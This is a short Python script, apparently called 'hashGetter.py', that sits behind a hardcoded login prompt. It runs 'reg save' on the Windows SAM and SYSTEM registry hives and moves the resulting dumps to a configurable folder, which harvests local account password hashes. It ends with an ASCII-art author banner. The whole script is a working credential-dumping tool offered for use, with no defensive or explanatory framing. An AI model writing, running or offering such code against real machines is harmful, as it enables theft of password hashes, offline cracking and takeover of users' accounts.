import os
import time
import shutil
import subprocess

correct_username = "NAME"     ############### CHANGE ###############
correct_password = "PASSWORD" ############### CHANGE ###############

while True:
        username = input("Enter username: ")
        password = input("Enter password: ")

        if username == correct_username and password == correct_password:
            print("Authentication successful.")
            break
        else:
            print("Wrong username or password. Please try again.")

print("")

try:
    subprocess.run("reg save HKLM\\sam sam.save", shell=True, check=True)
    subprocess.run("reg save HKLM\\system system.save", shell=True, check=True)

    def move_files(files, destination_folder):
        print("")
        try:
            if not os.path.exists(destination_folder):
                print(f"[ INFO ]: Destination folder '{destination_folder}' does not exist.")
                return

            for file in files:
                source_path = os.path.abspath(file)
                if not os.path.exists(source_path):
                    print(f"[ INFO ]: Source file '{source_path}' does not exist.")
                    continue

                file_name = os.path.basename(source_path)
                destination_path = os.path.join(destination_folder, file_name)
                shutil.move(source_path, destination_path)
                print(f"[  OK  ]: Saving file '{file_name}'.")
                print(f"[  OK  ]: Repositioning file '{file_name}' to '{destination_folder}'.")

        except Exception as e:
            print(f"An error occurred: {e}")

    if __name__ == "__main__":
        user_home = os.path.expanduser("~")
        source_files = [os.path.join(user_home, "sam.save"), os.path.join(user_home, "system.save")]

        destination_folder_path = "DESTINATION" ############### CHANGE ###############

        move_files(source_files, destination_folder_path)
        print("")
        print("[  OK  ]: Creating source file 'sam.save'")
        print("[  OK  ]: Creating source file 'system.save'")
        print("[  OK  ]: saving file 'sam.save'")
        print("[  OK  ]: saving file 'system.save'")
        print("[  OK  ]: repositioning file 'sam.save' to ", destination_folder_path)
        print("[  OK  ]: repositioning file 'system.save' to ", destination_folder_path)
        print("")
        print("[ INFO ]: script 'hashGetter.py' finished")

except subprocess.CalledProcessError as e:
    print("[ INFO ]: Failed to create registry backup. Please try to run the script with administrator privileges.")
    time.sleep(5)
    exit()
except Exception as e:
    print(f"[ INFO ]: An error occurred: {e}")

print("")
print("")
print("MADE BY:")
input(r""":::       ::: :::::::::: :::::::::      :::     ::::    ::::   ::::::::  
:+:       :+: :+:        :+:    :+:    :+:      +:+:+: :+:+:+ :+:    :+: 
+:+       +:+ +:+        +:+    +:+   +:+ +:+   +:+ +:+:+ +:+        +:+ 
+#+  +:+  +#+ :#::+::#   +#++:++#:   +#+  +:+   +#+  +:+  +#+     +#++:  
+#+ +#+#+ +#+ +#+        +#+    +#+ +#+#+#+#+#+ +#+       +#+        +#+ 
 #+#+# #+#+#  #+#        #+#    #+#       #+#   #+#       #+# #+#    #+# 
  ###   ###   ###        ###    ###       ###   ###       ###  ########  
""")
